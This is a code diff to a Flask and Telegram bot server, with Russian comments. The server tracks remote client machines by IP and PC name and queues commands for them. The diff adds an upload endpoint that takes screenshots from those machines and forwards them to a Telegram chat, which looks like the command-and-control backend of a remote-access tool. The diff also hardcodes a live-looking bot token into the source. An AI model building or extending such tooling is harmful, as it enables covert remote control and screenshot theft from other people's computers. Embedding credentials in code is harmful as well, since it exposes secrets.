@@ -6,13 +6,13 @@ import time
 from datetime import datetime, timedelta
 from flask import Flask, request, jsonify
 from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
 
 app = Flask(__name__)
 
 # ===== КОНФИГУРАЦИЯ =====
-TOKEN = os.environ.get('TOKEN')
-SECRET_KEY = os.environ.get('SECRET_KEY')
+TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"  # ВАШ ТОКЕН ЗДЕСЬ
+SECRET_KEY = "YOUR_SECRET_KEY"  # Должен совпадать с ключом на клиенте
 PORT = int(os.environ.get('PORT', 5000))
 # ========================
 
@@ -46,6 +46,7 @@ def heartbeat():
     clients[client_id] = {
         'last_seen': datetime.now(),
         'ip': data.get('ip', ''),
+        'pc_name': data.get('pc_name', 'Unknown'),
         'status': 'online'
     }
     return jsonify({'status': 'ok'})
@@ -59,6 +60,7 @@ def get_commands():
     
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
     commands = pending_commands.get(client_ip, [])
+    # Очищаем команды после отправки
     pending_commands[client_ip] = []
     return jsonify(commands)
 
@@ -79,6 +81,27 @@ def complete_command():
         ]
     
     return jsonify({'status': 'ok'})
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    """Загрузка файлов от клиента"""
+    if request.form.get('key') != SECRET_KEY:
+        return jsonify({'status': 'unauthorized'}), 401
+    
+    file = request.files.get('file')
+    if file:
+        # Сохраняем файл временно
+        filename = f"screenshot_{int(time.time())}.png"
+        file.save(filename)
+        # Отправляем файл в Telegram
+        try:
+            bot.send_photo(chat_id=YOUR_CHAT_ID, photo=open(filename, 'rb'))
+        except:
+            pass
+        os.remove(filename)
+        return jsonify({'status': 'success'})
+    
+    return jsonify({'status': 'no_file'}), 400
 
 async def send_menu(update: Update):
     """Отправка меню с кнопками"""
